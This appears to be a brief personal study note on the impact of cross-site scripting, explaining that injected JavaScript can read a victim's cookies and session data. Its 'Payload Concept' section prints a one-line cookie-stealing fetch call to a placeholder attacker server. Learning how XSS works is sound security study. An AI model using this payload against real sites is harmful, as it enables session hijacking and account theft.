## Overview
Today I explored the impact side of Cross-Site Scripting (XSS), focusing on how malicious JavaScript can access browser cookies and send them to an attacker-controlled server.

## Concept
JavaScript running in the victim's browser can access:
- document.cookie
- session identifiers
- authentication-related data

## Payload Concept
fetch('https://attacker-server/'+document.cookie)

## Key Insight
The danger of XSS is not the popup itself, but what malicious JavaScript can do with the victim’s trusted browser session.

